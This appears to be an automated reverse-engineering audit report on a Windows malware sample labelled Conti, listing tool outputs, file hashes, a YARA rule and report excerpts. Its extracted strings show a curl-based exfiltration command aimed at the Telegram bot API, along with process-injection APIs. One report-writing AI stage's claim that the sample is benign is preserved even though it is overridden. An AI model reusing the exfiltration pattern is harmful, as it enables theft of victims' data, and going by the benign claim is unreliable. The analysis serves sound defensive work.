  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "module_base": null,
  "entry_point": null,
  "key_events": [],
  "api_calls": [],
  "strings": []
}
```

- **frida_static_probe** ok=`True` checklist=`True` — Required checklist tool (frida_probe)

```json
{
  "frida_available": true,
  "frida_version": "17.16.4",
  "pe_probe": {
    "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "exists": true,
    "hook_candidates": [
      "KERNEL32.dll!CloseHandle",
      "KERNEL32.dll!CreateFileW",
      "KERNEL32.dll!CreateRemoteThread",
      "KERNEL32.
… [1328 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — Auto SQL seed for large-mode deep RE gate

```json
{
  "columns": [
    "name",
    "address",
    "size"
  ],
  "rows": [
    {
      "name": "__tmainCRTStartup",
      "address": "5368713280",
      "size": "980"
    },
    {
      "name": "_pei386_runtime_relocator",
      "address": "5368716480",
      "size": "887"
    },
    {
      "name": "WinMain",
      "address": "5368714576",
      "size": "727"
    },
    {
      "name": "mark_section
… [2440 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "func_name",
    "func_addr",
    "size",
    "instruction_count",
    "cyclomatic_complexity",
    "call_out_count",
    "string_ref_count"
  ],
  "rows": [
    {
      "func_name": "__tmainCRTStartup",
      "func_addr": "5368713280",
      "size": "980",
      "instruction_count": "222",
      "cyclomatic_complexity": "58",
      "call_out_count": "32",
      "string_ref_co
… [4814 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "C:\\Windows\\System32\\curl.exe",
      "address": "5368836128",
      "length": "58"
    },
    {
      "content": "https://api.telegram.org/bot",
      "address": "5368836224",
      "length": "60"
    },
    {
      "content": "/sendDocument",
      "address": "5368836382",
      "length": "30"

… [5477 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "name",
    "module",
    "address"
  ],
  "rows": [],
  "row_count": 0,
  "total_row_count": 0,
  "truncated": false,
  "source": "ghidra_query",
  "session_id": "ghidra-pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
  "audit_path": "/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/audit.jsonl"
}
```

- **ghidra_decompile** ok=`False` checklist=`False` — langgraph tool call
  - error: `session registry not found: /opt/samples/sessions/pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9.json`

```json
{
  "error": "session registry not found: /opt/samples/sessions/pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9.json"
}
```

- **ghidra_decompile** ok=`False` checklist=`False` — langgraph tool call
  - error: `session registry not found: /opt/samples/sessions/pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9.json`

```json
{
  "error": "session registry not found: /opt/samples/sessions/pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9.json"
}
```

- **ghidra_decompile** ok=`False` checklist=`False` — langgraph tool call
  - error: `session registry not found: /opt/samples/sessions/pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9.json`

```json
{
  "error": "session registry not found: /opt/samples/sessions/pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9.json"
}
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "name",
    "module",
    "address"
  ],
  "rows": [
    {
      "name": "__p__environ",
      "module": "API-MS-WIN-CRT-ENVIRONMENT-L1-1-0.DLL",
      "address": "32"
    },
    {
      "name": "_set_new_mode",
      "module": "API-MS-WIN-CRT-HEAP-L1-1-0.DLL",
      "address": "33"
    },
    {
      "name": "calloc",
      "module": "API-MS-WIN-CRT-HEAP-L1-1-0.DLL",
      "a
… [5561 more chars]
```

- **ghidra_query** ok=`False` checklist=`False` — langgraph tool call
  - error: `ghidrasql SQL error: no such column: from_func_name`

```json
{
  "error": "ghidrasql SQL error: no such column: from_func_name"
}
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "module"
  ],
  "rows": [
    {
      "module": "API-MS-WIN-CRT-ENVIRONMENT-L1-1-0.DLL"
    },
    {
      "module": "API-MS-WIN-CRT-HEAP-L1-1-0.DLL"
    },
    {
      "module": "API-MS-WIN-CRT-LOCALE-L1-1-0.DLL"
    },
    {
      "module": "API-MS-WIN-CRT-MATH-L1-1-0.DLL"
    },
    {
      "module": "API-MS-WIN-CRT-PRIVATE-L1-1-0.DLL"
    },
    {
      "module": "API-MS-W
… [509 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "func_name",
    "func_addr",
    "string_value",
    "string_addr",
    "string_length"
  ],
  "rows": [],
  "row_count": 0,
  "total_row_count": 0,
  "truncated": false,
  "source": "ghidra_query",
  "session_id": "ghidra-pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
  "audit_path": "/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e
… [29 more chars]
```

- **ghidra_query** ok=`False` checklist=`False` — langgraph tool call (redundant, skipped)
  - error: `redundant tool call (identical to a previous call)`

```json
{}
```

- **ghidra_query** ok=`False` checklist=`False` — langgraph tool call
  - error: `ghidrasql SQL error: no such column: from_func_addr`

```json
{
  "error": "ghidrasql SQL error: no such column: from_func_addr"
}
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "name",
    "address"
  ],
  "rows": [
    {
      "name": "CloseHandle",
      "address": "1"
    },
    {
      "name": "CreateFileW",
      "address": "2"
    },
    {
      "name": "CreateRemoteThread",
      "address": "3"
    },
    {
      "name": "CreateToolhelp32Snapshot",
      "address": "4"
    },
    {
      "name": "DeleteCriticalSection",
      "address": "5"
  
… [2072 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "name",
    "address",
    "size"
  ],
  "rows": [
    {
      "name": "CreateToolhelp32Snapshot",
      "address": "5368720312",
      "size": "6"
    },
    {
      "name": "FindProcessId",
      "address": "5368714416",
      "size": "149"
    },
    {
      "name": "Process32First",
      "address": "5368720184",
      "size": "6"
    },
    {
      "name": "Process32Next"
… [4905 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "src_func_addr",
    "src_func_name",
    "dst_func_addr",
    "dst_func_name",
    "call_site"
  ],
  "rows": [
    {
      "src_func_addr": "5368713264",
      "src_func_name": "safe_flush",
      "dst_func_addr": "5368719848",
      "dst_func_name": "fflush",
      "call_site": "5368713266"
    },
    {
      "src_func_addr": "5368713264",
      "src_func_name": "safe_flush
… [1010 more chars]
```

- **ghidra_query** ok=`False` checklist=`False` — langgraph tool call
  - error: `ghidrasql SQL error: no such column: from_func_addr`

```json
{
  "error": "ghidrasql SQL error: no such column: from_func_addr"
}
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "func_name",
    "func_addr",
    "string_value",
    "string_addr",
    "string_length"
  ],
  "rows": [],
  "row_count": 0,
  "total_row_count": 0,
  "truncated": false,
  "source": "ghidra_query",
  "session_id": "ghidra-pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
  "audit_path": "/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e
… [29 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "name",
    "address",
    "size"
  ],
  "rows": [
    {
      "name": "WinMain",
      "address": "5368714576",
      "size": "727"
    },
    {
      "name": ".text",
      "address": "5368715328",
      "size": "66"
    },
    {
      "name": "__do_global_ctors",
      "address": "5368715408",
      "size": "111"
    },
    {
      "name": "__main",
      "address": "536871
… [4747 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "from_ea",
    "to_ea",
    "is_code"
  ],
  "rows": [],
  "row_count": 0,
  "total_row_count": 0,
  "truncated": false,
  "source": "ghidra_query",
  "session_id": "ghidra-pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
  "audit_path": "/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/audit.jsonl"
}
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "name",
    "address",
    "size"
  ],
  "rows": [],
  "row_count": 0,
  "total_row_count": 0,
  "truncated": false,
  "source": "ghidra_query",
  "session_id": "ghidra-pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
  "audit_path": "/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/audit.jsonl"
}
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "name",
    "address",
    "size"
  ],
  "rows": [
    {
      "name": ".text",
      "address": "5368715328",
      "size": "66"
    },
    {
      "name": ".text",
      "address": "5368715568",
      "size": "3"
    },
    {
      "name": ".text",
      "address": "5368715760",
      "size": "218"
    },
    {
      "name": ".text",
      "address": "5368716016",
      "siz
… [4802 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "func_name",
    "func_addr",
    "string_value",
    "string_addr",
    "string_length"
  ],
  "rows": [
    {
      "func_name": "mark_section_writable",
      "func_addr": "5368716112",
      "string_value": "  VirtualProtect failed with code 0x%x",
      "string_addr": "5369172600",
      "string_length": "39"
    },
    {
      "func_name": "mark_section_writable",
      
… [475 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "func_name",
    "func_addr",
    "size",
    "instruction_count",
    "cyclomatic_complexity",
    "call_out_count",
    "string_ref_count"
  ],
  "rows": [
    {
      "func_name": ".text",
      "func_addr": "5368715760",
      "size": "218",
      "instruction_count": "49",
      "cyclomatic_complexity": "10",
      "call_out_count": "2",
      "string_ref_count": "9"
    
… [1722 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "C:\\Windows\\System32\\curl.exe",
      "address": "5368836128",
      "length": "58"
    },
    {
      "content": "https://api.telegram.org/bot",
      "address": "5368836224",
      "length": "60"
    },
    {
      "content": "/sendDocument",
      "address": "5368836382",
      "length": "30"

… [793 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "start_ea",
    "end_ea",
    "name",
    "class",
    "size",
    "is_read",
    "is_write",
    "is_exec"
  ],
  "rows": [
    {
      "start_ea": "5368709120",
      "end_ea": "5368710655",
      "name": "Headers",
      "class": "DATA",
      "size": "1536",
      "is_read": "1",
      "is_write": "0",
      "is_exec": "0"
    },
    {
      "start_ea": "5368713216",
     
… [4306 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "from_ea",
    "to_ea",
    "is_code"
  ],
  "rows": [],
  "row_count": 0,
  "total_row_count": 0,
  "truncated": false,
  "source": "ghidra_query",
  "session_id": "ghidra-pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
  "audit_path": "/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/audit.jsonl"
}
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "content",
    "address",
    "length"
  ],
  "rows": [
    {
      "content": "https://api.telegram.org/bot",
      "address": "5368836224",
      "length": "60"
    },
    {
      "content": "/sendDocument",
      "address": "5368836382",
      "length": "30"
    },
    {
      "content": "\"%s\" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -F 
… [5416 more chars]
```

- **ghidra_query** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "columns": [
    "name",
    "address",
    "size"
  ],
  "rows": [
    {
      "name": "CreateToolhelp32Snapshot",
      "address": "5368720312",
      "size": "6"
    },
    {
      "name": "FindProcessId",
      "address": "5368714416",
      "size": "149"
    },
    {
      "name": "WinMain",
      "address": "5368714576",
      "size": "727"
    },
    {
      "name": "WinMainCRTStartup",
… [4889 more chars]
```

- **pe_import_signals** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "engine": "pe_imports",
  "sample_size": 593885,
  "duration_s": 0.06,
  "import_count": 66,
  "signal_count": 5,
  "signals": [
    {
      "label": "allocate_memory",
      "api_match": "VirtualAllocEx",
      "attack": [
        "T1055"
      ]
    },
    {
      "label": "write_process_memory",
      "api_match": "WriteProcessMemory",
      "attack": [
        "T1055"
      ]
    },
    {

… [454 more chars]
```

- **r2_decompile** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "r2_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "disassembly": {
    "0x140001440": "\u254e   ;-- WinMainCRTStartup:\n\u250c 18: entry0 ();\n\u2502       \u254e   0x140001440      488b05c9ff..   mov rax, qword [0x140071410] ; synchapi.h:136:0 ; [0x140071410:8]=0x140074090
… [5804 more chars]
```

- **capa_analyze** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "rule_count": 17,
  "top_rules": [
    {
      "name": "encrypt data using RC4 PRGA",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Obfuscated Files or Information"
          ],
          "tactic": "Defense Evasion",
          "technique": "Obfuscated Files or Information",
          "subtechnique": "",
          "id": "T1027"
        }
      ],
 
… [6408 more chars]
```

### Artifact paths (verify on disk)

- **tools_raw:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/01-tools-raw.json` exists=`True` bytes=`108815` mtime=`2026-08-05T05:24:24.518998+00:00`
  - sha256: `33fb6cc9e1dbef327878a65f82dfd8c45a9f6d7785bdb6a5e5da53faa725b7fd`
- **sql_evidence:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/00-sql-evidence.json` exists=`False` bytes=`0` mtime=`None`
- **prompt:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/03-prompt.txt` exists=`False` bytes=`0` mtime=`None`
- **llm_raw:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/04-llm-raw.json` exists=`False` bytes=`0` mtime=`None`
- **deep05:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/05-deep-dive.json` exists=`True` bytes=`2734` mtime=`2026-08-05T05:26:09.303057+00:00`
  - sha256: `a8a3a788a6e5c30b8a24f0c16934feed8b2bfd423d30321d46bda7e3a68169a7`

#### prompt_excerpt

```

```


#### llm_raw_excerpt

```
{}
```


#### deep05_excerpt

```
{
  "source": "deep_dive_agentic",
  "engine": "langgraph",
  "verdict": "malicious",
  "confidence": 95,
  "summary": "This is a 64-bit Windows GUI PE that functions as a C2 beacon / info-stealer. Static and behavioral evidence show it exfiltrates data to Telegram via curl, uses a mutex (Global\\BeaconMutex_12345) to prevent multiple instances, performs process injection through VirtualAllocEx/WriteProcessMemory/CreateRemoteThread, enumerates processes via Toolhelp32 snapshots, and contains an embedded PE plus RC4 obfuscation. The sample has a large .data region and overlay, consistent with packed or resource-rich malware.",
  "key_evidence": [
    "https://api.telegram.org/bot",
    "/sendDocument",
    "\"%s\" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -
… [1934 more chars]
```

- **agentic:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/deep_dive/agentic_deep_dive.json` exists=`True` bytes=`484097` mtime=`2026-08-05T05:26:09.303057+00:00`
  - sha256: `9d436ffa8394a1c1b2e4e1c8d4aef0c91bd8d7d13912903fb66939927827eafb`

---

## Stage: yara_gen

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| rule_yar | `True` |
| non_empty | `True` |
| has_rule_block | `True` |
| rule_compiles | `True` |
| rule_check | `ok` |
| meta_yara_valid | `True` |

### Artifact paths (verify on disk)

- **rule_yar:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/rule.yar` exists=`True` bytes=`2110` mtime=`2026-08-05T05:26:10.684060+00:00`
  - sha256: `f08edec201e321414fbdb483da31f274f99ac77e58556521f6627c5b23446e36`

#### excerpt

```
// yara_gen_v2.py — 2026-08-05T05:26:10.684374+00:00
rule CADRE_v2_unknown_28ea44a49cb4 {
    meta:
        description = "RevAI v2 auto rule for unknown"
        sha256 = "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9"
        family = "unknown"
        revai = true
        severity = "high"
        confidence = "medium"
    strings:
        $s0 = "_ZNK10__cxxabiv120__si_class_type_info12__do_dyncastExNS_17__class_type_info10__sub_kindEPKS1_PKvS4_S6_RNS1_16__dyncast_resultE" ascii wide
        $s1 = ".xdata$_ZNK10__cxxabiv117__class_type_info12__do_dyncastExNS0_10__sub_kindEPKS0_PKvS3_S5_RNS0_16__dyncast_resultE" ascii wide
        $s2 = ".pdata$_ZNK10__cxxabiv117__class_type_info12__do_dyncastExNS0_10__sub_kindEPKS0_PKvS3_S5_RNS0_16__dyncast_resultE" ascii 
… [1308 more chars]
```


---

## Stage: publish

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| REPORT_MASTER_v2 | `True` |
| REPORT_MASTER_v3 | `True` |
| REPORT_v2 | `True` |
| REPORT_TECHNICAL_v2 | `True` |
| REPORT_TECHNICAL_v3 | `True` |
| v2_min_chars | `True` |
| v3_min_chars | `True` |
| v2_heads | `True` |
| v3_heads | `True` |
| v2_fresh_vs_deep | `True` |
| v3_fresh_vs_deep | `True` |
| not_llm_env_failure_v2 | `True` |
| not_llm_env_failure_v3 | `True` |
| v2_no_missing_sections | `True` |
| verdict_lock_ok | `True` |
| quality_pack_ok | `True` |
| master_source_llm | `True` |
| tech2_source_llm | `True` |
| tech3_source_ok | `True` |
| tech2_no_stubs | `True` |
| no_tech2_fallback | `True` |
| quality_issues | `[]` |
| engine_citation_ok | `True` |

### Artifact paths (verify on disk)

- **REPORT_MASTER_v2:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/REPORT-MASTER-v2.md` exists=`True` bytes=`24760` mtime=`2026-08-05T05:27:52.633085+00:00`
  - sha256: `9322da00d4a234c860bb43dd23198e4ad43771ee11926a462a64c4dc78ab7dfc`
- **REPORT_MASTER_v3:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/REPORT-MASTER-v3.md` exists=`True` bytes=`68991` mtime=`2026-08-05T05:40:17.133794+00:00`
  - sha256: `e8ef1452f4b4dd08ccdb911554f12a41ca6901442529ad61797711c3f2304c0a`
- **REPORT_v2:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/REPORT-v2.md` exists=`True` bytes=`24760` mtime=`2026-08-05T05:27:52.633085+00:00`
  - sha256: `9322da00d4a234c860bb43dd23198e4ad43771ee11926a462a64c4dc78ab7dfc`
- **REPORT_TECHNICAL_v2:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/REPORT-TECHNICAL-v2.md` exists=`True` bytes=`84329` mtime=`2026-08-05T05:36:02.388756+00:00`
  - sha256: `52d952a830e03e598ff5f29b74d637a263af24efe34dc59fd3c1291e84f123a0`
- **REPORT_TECHNICAL_v3:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/REPORT-TECHNICAL-v3.md` exists=`True` bytes=`66075` mtime=`2026-08-05T05:42:08.298260+00:00`
  - sha256: `97d93f4efc22f1001f52a9aa9b8ea14ced4165745c42fa8ff017da18ae9d336b`
- **report_v2_json:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/report-v2.json` exists=`True` bytes=`27262` mtime=`2026-08-05T05:36:02.393756+00:00`
  - sha256: `dd52be9f3765170f24937f3bdd9ac9bb6f00fe91a46951687020b809ae162eec`

#### v2_excerpt

```
# Classification (multi-source — V5.12)

| Source | Verdict |
|--------|--------|
| **Final (locked)** | **malicious** |
| Triage upstream (quick ∪ deep) | malicious |
| Quick scan | Malicious |
| Deep dive | malicious |
| Publish LLM (claimed) | benign |

- **Lock reason:** publish LLM claimed `benign` but upstream triage is `malicious` (YARA / tool-backed: spyeye, IsPE64, IsWindowsGUI, HasOverlay, SEH__v4, inject_thread, screenshot, win_mutex). Final verdict follows triage; dual-use branding does not clear the sample.
- **Family (triage):** Conti (ransomware loader/initial access payload)
- **Honesty:** the publish narrative below is **preserved unedited** so analysts can see what the report LLM argued. It is **not** a clearance.

---

### Publish LLM narrative (unedited)

## Executive Summary
This report details the analysis of a malicious 64-bit Windows PE sample identified as a Cont
… [23856 more chars]
```


#### v3_excerpt

```
# RE Report — 28ea44a49cb4
_Generated 2026-08-05T05:40:17.130924+00:00_  
_Pipeline: section-based Map-Reduce, 2 pass-1 LLM calls + 15 pass-2 calls with cross-section context + 2 local sections_

<!-- section: Executive Summary | pass=2 | evidence=275c | cross_refs=True | llm_ok=True | runtime=25.07s -->

# Executive Summary

| Metric | Value | Source |
|--------|-------|--------|
| Verdict | Malicious | cross-section:2. Classification, deep_dive_agentic |
| Malware Family | Conti (ransomware loader/initial access payload) | cross-section:2. Classification, cross-section:9. Comparison with Known Families, yara |
| Analysis Confidence | 95% | deep_dive_agentic |
| Analysis Agreement | LLM and v1 static analysis engine agree | v1_summary |
| Static Analysis Score | 290 (12 YARA matches, 17 capa rule matches) | cross-section:3. Initial Triage, v1_summary |

The analyzed 64-bit Portable Exec
… [68081 more chars]
```


---

## Manual verification checklist (public showcase)

1. Open every **Artifact path** and confirm bytes/mtime/sha256 match this report.
2. For each tool: confirm raw excerpt matches on-disk JSON (`01-tools-raw.json`).
3. For each LLM stage: `key_evidence` strings appear in tool/SQL JSON (citation grounding).
4. Confirm REPORT-MASTER-v2 **and** REPORT-MASTER-v3 are fresh vs deep_dive mtime.
5. If capa salvaged: malcat `capa_summary` exists and LLM cited it.
6. Showcase pack under `/opt/samples/logs/_showcase_audits/<sha>/` is complete.
